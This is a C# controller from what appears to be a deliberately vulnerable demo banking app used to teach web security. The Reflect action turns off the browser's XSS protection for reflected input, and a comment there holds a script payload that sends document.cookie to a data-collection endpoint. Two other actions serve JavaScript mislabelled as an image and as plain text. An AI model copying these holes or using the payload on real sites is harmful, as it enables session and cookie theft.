using System;
using System.Diagnostics;
using ElmahCore;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using TerribleBankInc.Models.ViewModels;

namespace TerribleBankInc.Controllers
{
    public class HomeController : BaseController
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        public IActionResult Boom()
        {
            HttpContext.RiseError(new NotImplementedException("Forgot something?"));
            return null;
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }

        public IActionResult Reflect(string search = null)
        {
            //<script>const request = new Request('https://localhost:44367/api/Gimme?stringData='+"{'ID':0,'DataType':'Cookie','Data':'"+document.cookie+"'}", {method: 'GET'});fetch(request);</script>

            Response.Headers.Add("X-Xss-Protection", "0");
            return View(nameof(Reflect), search);
        }










        public string ImageJpg()
        {
            Response.ContentType = "image/jpg";
            return "alert('Hello from image!');";
        }

        public string TextPlain()
        {
            Response.ContentType = "text/plain";
            //Response.Headers.Add("X-Content-Type-Options", "nosniff");
            return "alert('Hello from text!');";
        }
    }
}
